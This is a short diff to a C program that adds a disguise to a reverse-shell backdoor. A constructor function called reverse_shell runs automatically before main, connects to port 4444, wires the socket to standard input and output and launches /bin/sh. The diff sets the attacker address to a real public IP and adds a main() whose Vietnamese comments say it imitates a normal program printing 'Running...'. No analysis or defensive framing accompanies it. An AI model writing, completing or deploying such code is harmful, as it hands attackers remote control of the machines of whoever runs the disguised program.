@@ -8,7 +8,7 @@
 
 __attribute__((constructor)) static void reverse_shell(void)
 {
-    char *server_ip="0.0.0.0";
+    char *server_ip="171.239.11.33";
     uint32_t server_port=4444;
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in attacker_addr = {0};
@@ -22,4 +22,17 @@ __attribute__((constructor)) static void reverse_shell(void)
     dup2(sock, 2);
     char *args[] = {"/bin/sh", NULL};
     execve("/bin/sh", args, NULL);
+}
+
+int main() {
+    // Phần code chính của chương trình
+    printf("Program is running..\n");
+
+    // Giả lập một chương trình bình thường
+    while (1) {
+        printf("Running...\n");
+        sleep(1);
+    }
+
+    return 0;
 }
